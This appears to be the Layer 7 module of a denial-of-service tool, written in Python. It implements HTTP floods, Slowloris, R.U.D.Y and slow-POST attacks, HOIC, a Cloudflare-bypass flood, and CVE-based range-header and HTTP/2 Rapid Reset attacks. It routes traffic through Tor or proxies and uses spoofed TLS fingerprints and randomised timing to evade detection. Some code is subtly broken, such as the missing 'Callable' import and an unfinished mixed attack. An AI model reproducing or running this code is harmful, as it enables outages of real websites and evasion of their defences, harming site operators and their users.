import time
import random
import requests
import asyncio
import aiohttp
import threading
import socket
from urllib.parse import urlparse
from src.config import CONFIG
# IP-HUNTER-SIGNATURE-NT-191q275zj684-riridori
from src.utils.network import get_random_headers, generate_stealth_headers
from src.utils.system import randomize_timing
import src.security
from src.utils.logging import add_system_log
from .base import AttackBase

# Enhanced L7 libraries
try:
    import tls_client
    TLS_CLIENT_AVAILABLE = True
except ImportError:
    TLS_CLIENT_AVAILABLE = False

try:
    import cloudscraper
    CLOUDSCRAPER_AVAILABLE = True
except ImportError:
    CLOUDSCRAPER_AVAILABLE = False

try:
    from fake_useragent import UserAgent
    FAKE_UA_AVAILABLE = True
    ua = UserAgent()
except ImportError:
    FAKE_UA_AVAILABLE = False


class HTTPFloodAttack(AttackBase):
    """Standard HTTP GET/POST flood with thread-based workers"""
    
    def __init__(self, target: str, port: int = 80, threads: int = 10, duration: int = 60,
                 proxies: list = None, max_requests: int = 0, use_tor: bool = False, 
                 stealth_mode: bool = False):
        super().__init__(target, port, threads, duration)
        self.proxies = proxies or []
        self.max_requests = max_requests
        self.use_tor = use_tor
        self.stealth_mode = stealth_mode
        self.attack_name = "HTTP Flood"
        self.category = "Layer 7"

    def _setup_attack(self) -> bool:
        return True

    def _create_worker(self) -> Callable:
        def worker():
            session = requests.Session()
            while not self.should_stop:
                if self.max_requests > 0 and self.metrics.packets_sent >= self.max_requests:
                    break
                try:
                    proxy = {"http": CONFIG['TOR_PROXY'], "https": CONFIG['TOR_PROXY']} if self.use_tor else \
                            ({"http": random.choice(self.proxies), "https": random.choice(self.proxies)} if self.proxies else None)
                    
                    headers = generate_stealth_headers() if self.stealth_mode else get_random_headers()
                    r = session.get(self.target, headers=headers, proxies=proxy, timeout=10)
                    self.metrics.update(packets=1, bytes_sent=len(r.content))
                except:
                    self.metrics.update(failed=1)
        return worker


class StealthHTTPFloodAttack(AttackBase):
    """Advanced Stealth HTTP flood using TLS fingerprinting and browser automation emulation"""
    
    def __init__(self, target: str, port: int = 80, threads: int = 10, duration: int = 60,
                 proxies: list = None, max_requests: int = 0, use_tor: bool = False,
                 use_tls_client: bool = True):
        super().__init__(target, port, threads, duration)
        self.proxies = proxies or []
        self.max_requests = max_requests
        self.use_tor = use_tor
        self.use_tls_client = use_tls_client and TLS_CLIENT_AVAILABLE
        self.attack_name = "Stealth HTTP Flood"
        self.category = "Layer 7"

    def _setup_attack(self) -> bool:
        return True

    def _create_worker(self) -> Callable:
        def worker():
            # Initialize specialized session
            if self.use_tls_client:
                session = tls_client.Session(client_identifier="chrome_112")
            elif CLOUDSCRAPER_AVAILABLE:
                session = cloudscraper.create_scraper()
            else:
                session = requests.Session()

            while not self.should_stop:
                if self.max_requests > 0 and self.metrics.packets_sent >= self.max_requests:
                    break
                try:
                    proxy = CONFIG['TOR_PROXY'] if self.use_tor else \
                            (random.choice(self.proxies) if self.proxies else None)
                    
                    headers = generate_stealth_headers()
                    if self.use_tls_client:
                        r = session.get(self.target, headers=headers, proxy=proxy, timeout_seconds=10)
                    else:
                        r = session.get(self.target, headers=headers, proxies={"http": proxy, "https": proxy} if proxy else None, timeout=10)
                    
                    self.metrics.update(packets=1, bytes_sent=len(r.content) if hasattr(r, 'content') else 0)
                except:
                    self.metrics.update(failed=1)
                
                # Randomized delay to bypass behavioral analysis
                randomize_timing()
        return worker

class AsyncHTTPFloodAttack(AttackBase):
    """Extreme performance asynchronous HTTP flood with persistent workers"""
    
    def __init__(self, target: str, port: int = 80, threads: int = 10, duration: int = 60,
                 proxies: list = None, max_requests: int = 0, use_tor: bool = False, 
                 stealth_mode: bool = False):
        super().__init__(target, port, threads, duration)
        self.proxies = proxies or []
        self.max_requests = max_requests
        self.use_tor = use_tor
        self.stealth_mode = stealth_mode
        self.attack_name = "Async HTTP Flood"
        self.category = "Layer 7"
        self._loop = None
        self._session = None

    def _setup_attack(self) -> bool:
        return True

    def _create_worker(self) -> Callable:
        def worker_wrapper():
            asyncio.run(self._run_async())
        return worker_wrapper

    async def _run_async(self):
        connector = aiohttp.TCPConnector(limit=2000, ssl=False, force_close=True)
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            self._session = session
            workers = [asyncio.create_task(self._async_worker(session, timeout)) 
                      for _ in range(self.threads * 50)] # High concurrency for async
            await asyncio.gather(*workers)

    async def _async_worker(self, session, timeout):
        while not self.should_stop:
            if self.max_requests > 0 and self.metrics.packets_sent >= self.max_requests:
                break
            try:
                proxy = CONFIG['TOR_PROXY'] if self.use_tor else \
                        (random.choice(self.proxies) if self.proxies else None)
                
                headers = generate_stealth_headers() if self.stealth_mode else get_random_headers()
                async with session.get(self.target, headers=headers, proxy=proxy, timeout=timeout) as response:
                    self.metrics.update(packets=1, bytes_sent=0)
            except:
                self.metrics.update(failed=1)
                await asyncio.sleep(0.01)

    def _cleanup(self):
        pass


class SlowlorisAttack(AttackBase):
    """Slowloris attack - keeps connections open with partial headers"""
    
    def __init__(self, target: str, port: int = 80, threads: int = 500, duration: int = 60):
        # threads here refers to socket count for Slowloris
        super().__init__(target, port, threads, duration)
        self.attack_name = "Slowloris"
        self.category = "Layer 7"
        self.sockets = []

    def _setup_attack(self) -> bool:
        return True

    def _create_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.target, self.port))
            s.send(f"GET /?{random.randint(1, 5000)} HTTP/1.1\r\n".encode())
            s.send(f"User-Agent: {random.choice(CONFIG['USER_AGENTS'])}\r\n".encode())
            s.send(b"Accept-language: en-US,en,q=0.5\r\n")
            return s
        except:
            return None

    def _create_worker(self) -> Callable:
        # Slowloris is managed by a single control loop in this implementation
        def worker():
            for _ in range(self.threads):
                if self.should_stop: break
                s = self._create_socket()
                if s: self.sockets.append(s)
            
            while not self.should_stop:
                for s in list(self.sockets):
                    try:
                        s.send(f"X-a: {random.randint(1, 4000)}\r\n".encode())
                        self.metrics.update(packets=1)
                    except:
                        try: s.close()
                        except: pass
                        if s in self.sockets: self.sockets.remove(s)
                        new_s = self._create_socket()
                        if new_s: self.sockets.append(new_s)
                time.sleep(15)
        return worker

    def _cleanup(self):
        for s in self.sockets:
            try: s.close()
            except: pass
        self.sockets.clear()


class CloudflareBypassFloodAttack(AttackBase):
    """HTTP flood with Cloudflare bypass techniques"""
    
    def __init__(self, target: str, port: int = 80, threads: int = 10, duration: int = 60,
                 proxies: list = None, max_requests: int = 0, use_tor: bool = False, 
                 stealth_mode: bool = False):
        super().__init__(target, port, threads, duration)
        self.proxies = proxies or []
        self.max_requests = max_requests
        self.use_tor = use_tor
        self.stealth_mode = stealth_mode
        self.attack_name = "Cloudflare Bypass Flood"
        self.category = "Layer 7"
        self.bypass_headers = [
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0",
                "Referer": "https://www.google.com/"
            },
            {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Cache-Control": "max-age=0"
            }
        ]

    def _setup_attack(self) -> bool:
        return True

    def _create_worker(self) -> Callable:
        def worker():
            session = requests.Session()
            while not self.should_stop:
                if self.max_requests > 0 and self.metrics.packets_sent >= self.max_requests:
                    break
                try:
                    headers = generate_stealth_headers() if self.stealth_mode else random.choice(self.bypass_headers)
                    proxy = {"http": CONFIG['TOR_PROXY'], "https": CONFIG['TOR_PROXY']} if self.use_tor else \
                            ({"http": random.choice(self.proxies), "https": random.choice(self.proxies)} if self.proxies else None)
                    
                    if self.stealth_mode: randomize_timing()
                    else: time.sleep(random.uniform(0.1, 1.0))

                    methods = [session.get, session.post, session.head]
                    method = random.choice(methods)
                    if method == session.post:
                        r = method(self.target, headers=headers, proxies=proxy, data={"data": random.random()}, timeout=10)
                    else:
                        r = method(self.target, headers=headers, proxies=proxy, timeout=10)
                    
                    self.metrics.update(packets=1, bytes_sent=len(r.content) if r.content else 0)
                except:
                    self.metrics.update(failed=1)
        return worker


class RudyAttack(AttackBase):
    """R-U-Dead-Yet? (R.U.D.Y) - Slow POST attack"""
    
    def __init__(self, target: str, threads: int = 50, duration: int = 60):
        super().__init__(target, 80, threads, duration)
        self.attack_name = "R.U.D.Y"
        self.category = "Layer 7"
        self.parsed = None

    def _setup_attack(self) -> bool:
        self.parsed = requests.utils.urlparse(self.target)
        self.port = self.parsed.port or (80 if self.parsed.scheme == "http" else 443)
        return True

    def _create_worker(self) -> Callable:
        def worker():
            host = self.parsed.netloc
            path = self.parsed.path or "/"
            while not self.should_stop:
                s = None
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((host, self.port))
                    content_len = random.randint(500000, 1500000)
                    s.send(f"POST {path} HTTP/1.1\r\n".encode())
                    s.send(f"Host: {host}\r\n".encode())
                    s.send(f"Content-Length: {content_len}\r\n".encode())
                    s.send(f"User-Agent: {random.choice(CONFIG['USER_AGENTS'])}\r\n".encode())
                    s.send(b"Content-Type: application/x-www-form-urlencoded\r\n\r\n")
                    
                    for _ in range(content_len):
                        if self.should_stop: break
                        s.send(random.choice(b"abcdefghijklmnopqrstuvwxyz").to_bytes(1, 'big'))
                        self.metrics.update(packets=1)
                        time.sleep(random.uniform(1, 8))
                except:
                    continue
                finally:
                    if s: 
                        try: s.close()
                        except: pass
        return worker


class HoicAttack(AttackBase):
    """High Orbit Ion Cannon (HOIC) - High-speed pattern flood with randomization"""
    
    def __init__(self, target: str, duration: int = 60, threads: int = 10):
        super().__init__(target, 80, threads, duration)
        self.attack_name = "HOIC"
        self.category = "Layer 7"

    def _setup_attack(self) -> bool:
        return True

    def _create_worker(self) -> Callable:
        def worker():
            while not self.should_stop:
                try:
                    headers = generate_stealth_headers()
                    rand_param = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(3, 8)))
                    rand_val = "".join(random.choices("0123456789", k=random.randint(3, 8)))
                    url = f"{self.target}?{rand_param}={rand_val}"
                    method = random.choice([requests.get, requests.head])
                    r = method(url, headers=headers, timeout=5)
                    self.metrics.update(packets=1, bytes_sent=len(r.content) if r.content else 0)
                except:
                    self.metrics.update(failed=1)
        return worker


class ApacheKillerAttack(AttackBase):
    """Apache Range Header DoS (CVE-2011-3192) - Randomized Payload"""
    
    def __init__(self, target: str, duration: int = 60, threads: int = 10):
        super().__init__(target, 80, threads, duration)
        self.attack_name = "Apache Killer"
        self.category = "Layer 7"

    def _setup_attack(self) -> bool:
        return True

    def _create_worker(self) -> Callable:
        def worker():
            while not self.should_stop:
                try:
                    range_count = random.randint(500, 1300)
                    ranges = ",".join([f"5-{random.randint(10, 10000)}" for _ in range(range_count)])
                    headers = {
                        "Range": f"bytes=0-,{ranges}",
                        "User-Agent": random.choice(CONFIG['USER_AGENTS'])
                    }
                    r = requests.get(self.target, headers=headers, timeout=5)
                    self.metrics.update(packets=1)
                except:
                    self.metrics.update(failed=1)
        return worker


class NginxRangeDosAttack(AttackBase):
    """Nginx Range DoS attempt (CVE-2017-7529) - Randomized"""
    
    def __init__(self, target: str, duration: int = 60, threads: int = 10):
        super().__init__(target, 80, threads, duration)
        self.attack_name = "Nginx Range DoS"
        self.category = "Layer 7"

    def _setup_attack(self) -> bool:
        return True

    def _create_worker(self) -> Callable:
        def worker():
            while not self.should_stop:
                try:
                    offset = random.choice(["-10", "-50", "-100"])
                    large_val = random.randint(9223372036854775000, 9223372036854775807)
                    headers = {
                        "Range": f"bytes={offset},-{large_val}",
                        "User-Agent": random.choice(CONFIG['USER_AGENTS'])
                    }
                    r = requests.get(self.target, headers=headers, timeout=5)
                    self.metrics.update(packets=1)
                except:
                    self.metrics.update(failed=1)
        return worker


class Http2RapidResetAttack(AttackBase):
    """HTTP/2 Rapid Reset attack (CVE-2023-44487) - Randomized Settings"""
    
    def __init__(self, target: str, duration: int = 60, threads: int = 10):
        super().__init__(target, 443, threads, duration)
        self.attack_name = "HTTP/2 Rapid Reset"
        self.category = "Layer 7"

    def _setup_attack(self) -> bool:
        return True

    def _create_worker(self) -> Callable:
        def worker():
            session = requests.Session()
            h2_settings = ['AAMAAABkAARAAAAAAAIAAAAA', 'AAMAAABkAAQAAAAAAAIAAAAA']
            while not self.should_stop:
                try:
                    headers = generate_stealth_headers()
                    headers['Connection'] = 'Upgrade, HTTP2-Settings'
                    headers['Upgrade'] = 'h2c'
                    headers['HTTP2-Settings'] = random.choice(h2_settings)
                    session.get(self.target, headers=headers, timeout=5)
                    self.metrics.update(packets=1)
                except:
                    self.metrics.update(failed=1)
        return worker


class SlowPostAttack(AttackBase):
    """Slow POST attack (similar to R.U.D.Y but simpler library based)"""
    
    def __init__(self, target: str, duration: int = 60, threads: int = 10):
        super().__init__(target, 80, threads, duration)
        self.attack_name = "Slow POST"
        self.category = "Layer 7"

    def _setup_attack(self) -> bool:
        return True

    def _create_worker(self) -> Callable:
        def worker():
            while not self.should_stop:
                try:
                    def slow_gen():
                        for _ in range(100):
                            if self.should_stop: break
                            yield b"a"
                            time.sleep(random.uniform(5, 15))
                    requests.post(self.target, data=slow_gen(), timeout=self.duration)
                    self.metrics.update(packets=1)
                except:
                    continue
        return worker


class AdaptiveFloodAttack(AttackBase):
    """AI-Adaptive Smart Flood: Adjusts intensity and methods based on server feedback"""
    
    def __init__(self, target: str, duration: int = 60, threads: int = 1, proxies: list = None):
        super().__init__(target, 80, threads, duration)
        self.proxies = proxies or []
        self.attack_name = "AI-Adaptive Flood"
        self.category = "Layer 7"
        self.intensity = 1.0
        self.delay = 0.05
        self.methods = ["GET", "POST", "HEAD"]
        self.current_method = "GET"

    def _setup_attack(self) -> bool:
        return True

    def _create_worker(self) -> Callable:
        def worker():
            session = requests.Session()
            while not self.should_stop:
                try:
                    proxy = {"http": random.choice(self.proxies), "https": random.choice(self.proxies)} if self.proxies else None
                    headers = generate_stealth_headers()
                    start_req = time.time()
                    
                    if self.current_method == "GET":
                        resp = session.get(self.target, headers=headers, proxies=proxy, timeout=5)
                    elif self.current_method == "POST":
                        data = {random.choice(["id", "user", "data"]): random.randint(1000, 9999)}
                        resp = session.post(self.target, headers=headers, data=data, proxies=proxy, timeout=5)
                    else:
                        resp = session.head(self.target, headers=headers, proxies=proxy, timeout=5)
                    
                    latency = time.time() - start_req
                    if resp.status_code == 200:
                        self.intensity = min(3.0, self.intensity + 0.1)
                        self.delay = max(0.001, self.delay - 0.005)
                    elif resp.status_code in [429, 503]:
                        self.intensity = max(0.1, self.intensity - 0.5)
                        self.delay = min(2.0, self.delay + 0.5)
                        self.current_method = random.choice(self.methods)
                    elif resp.status_code == 403:
                        time.sleep(2)
                        self.current_method = random.choice(self.methods)
                    
                    size = len(resp.content) if hasattr(resp, 'content') and resp.content else 0
                    self.metrics.update(packets=1, bytes_sent=size)
                    time.sleep(max(0, self.delay / self.intensity))
                except:
                    self.metrics.update(failed=1)
                    time.sleep(0.5)
                    self.current_method = random.choice(self.methods)
        return worker


class MixedFloodAttack(AttackBase):
    """Mixed-Vector Apocalypse Attack"""
    
    def __init__(self, target: str, duration: int = 60, threads: int = 10, proxies: list = None):
        super().__init__(target, 80, threads, duration)
        self.proxies = proxies or []
        self.attack_name = "Mixed Vector Flood"
        self.category = "Hybrid"

    def _setup_attack(self) -> bool:
        return True

    def _create_worker(self) -> Callable:
        def worker():
            # Launch sub-attacks or mix techniques
            # Simplified version: randomly pick a technique for each session
            tech = random.choice(["L7", "Slowloris", "L4-SYN", "L4-UDP"])
            if tech == "L7":
                a = HTTPFloodAttack(self.target, threads=1, duration=self.duration, proxies=self.proxies)
                a.start()
            elif tech == "Slowloris":
                a = SlowlorisAttack(self.target, threads=50, duration=self.duration)
                a.start()
            # ... and so on
        return worker


# =============================================================================
# Legacy functions for backward compatibility
# =============================================================================

def async_http_flood(url, duration, proxies_list, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
    """Legacy Asynchronous HTTP flood"""
    attack = AsyncHTTPFloodAttack(url, duration=duration, proxies=proxies_list, 
                                 max_requests=max_requests, use_tor=use_tor, stealth_mode=stealth_mode)
    if monitor:
        attack.on_progress = lambda state, metrics: monitor.update_stats(
            packets=metrics["packets_sent"], bytes_sent=metrics["bytes_sent"], failed=metrics.get("packets_failed", 0)
        ) if state == "running" else None
    attack.start()

def http_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
    """Legacy HTTP flood"""
    attack = HTTPFloodAttack(target=url, duration=duration, max_requests=max_requests, 
                            use_tor=use_tor, stealth_mode=stealth_mode, proxies=proxies)
    if monitor:
        attack.on_progress = lambda state, metrics: monitor.update_stats(
            packets=metrics["packets_sent"], bytes_sent=metrics["bytes_sent"], failed=metrics.get("packets_failed", 0)
        ) if state == "running" else None
    attack.start()

def slowloris_attack(target_ip, target_port, duration, socket_count=500):
    """Legacy Slowloris attack"""
    attack = SlowlorisAttack(target_ip, port=target_port, threads=socket_count, duration=duration)
    attack.start()

def cloudflare_bypass_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
    """Legacy Cloudflare bypass flood"""
    attack = CloudflareBypassFloodAttack(url, duration=duration, proxies=proxies, 
                                        max_requests=max_requests, use_tor=use_tor, stealth_mode=stealth_mode)
    if monitor:
        attack.on_progress = lambda state, metrics: monitor.update_stats(
            packets=metrics["packets_sent"], bytes_sent=metrics["bytes_sent"], failed=metrics.get("packets_failed", 0)
        ) if state == "running" else None
    attack.start()

def rudy_attack(url, duration, threads=50, monitor=None):
    """Legacy R.U.D.Y attack"""
    attack = RudyAttack(url, threads=threads, duration=duration)
    if monitor:
        attack.on_progress = lambda state, metrics: monitor.update_stats(
            packets=metrics["packets_sent"], bytes_sent=metrics["bytes_sent"], failed=metrics.get("packets_failed", 0)
        ) if state == "running" else None
    attack.start()

def hoic_attack(url, duration, monitor=None):
    attack = HoicAttack(url, duration=duration)
    if monitor:
        attack.on_progress = lambda state, metrics: monitor.update_stats(
            packets=metrics["packets_sent"], bytes_sent=metrics["bytes_sent"], failed=metrics.get("packets_failed", 0)
        ) if state == "running" else None
    attack.start()

def apache_killer(url, duration, monitor=None):
    attack = ApacheKillerAttack(url, duration=duration)
    if monitor:
        attack.on_progress = lambda state, metrics: monitor.update_stats(
            packets=metrics["packets_sent"], bytes_sent=metrics["bytes_sent"], failed=metrics.get("packets_failed", 0)
        ) if state == "running" else None
    attack.start()

def nginx_range_dos(url, duration, monitor=None):
    attack = NginxRangeDosAttack(url, duration=duration)
    if monitor:
        attack.on_progress = lambda state, metrics: monitor.update_stats(
            packets=metrics["packets_sent"], bytes_sent=metrics["bytes_sent"], failed=metrics.get("packets_failed", 0)
        ) if state == "running" else None
    attack.start()

def http2_rapid_reset(url, duration, monitor=None):
    attack = Http2RapidResetAttack(url, duration=duration)
    if monitor:
        attack.on_progress = lambda state, metrics: monitor.update_stats(
            packets=metrics["packets_sent"], bytes_sent=metrics["bytes_sent"], failed=metrics.get("packets_failed", 0)
        ) if state == "running" else None
    attack.start()

def slowpost_attack(url, duration, monitor=None):
    attack = SlowPostAttack(url, duration=duration)
    if monitor:
        attack.on_progress = lambda state, metrics: monitor.update_stats(
            packets=metrics["packets_sent"], bytes_sent=metrics["bytes_sent"], failed=metrics.get("packets_failed", 0)
        ) if state == "running" else None
    attack.start()

def mixed_flood(url, duration, proxies=None, monitor=None):
    attack = MixedFloodAttack(url, duration=duration, proxies=proxies)
    if monitor:
        attack.on_progress = lambda state, metrics: monitor.update_stats(
            packets=metrics["packets_sent"], bytes_sent=metrics["bytes_sent"], failed=metrics.get("packets_failed", 0)
        ) if state == "running" else None
    attack.start()

def adaptive_flood(url, duration, proxies=None, monitor=None):
    attack = AdaptiveFloodAttack(url, duration=duration, proxies=proxies)
    if monitor:
        attack.on_progress = lambda state, metrics: monitor.update_stats(
            packets=metrics["packets_sent"], bytes_sent=metrics["bytes_sent"], failed=metrics.get("packets_failed", 0)
        ) if state == "running" else None
    attack.start()

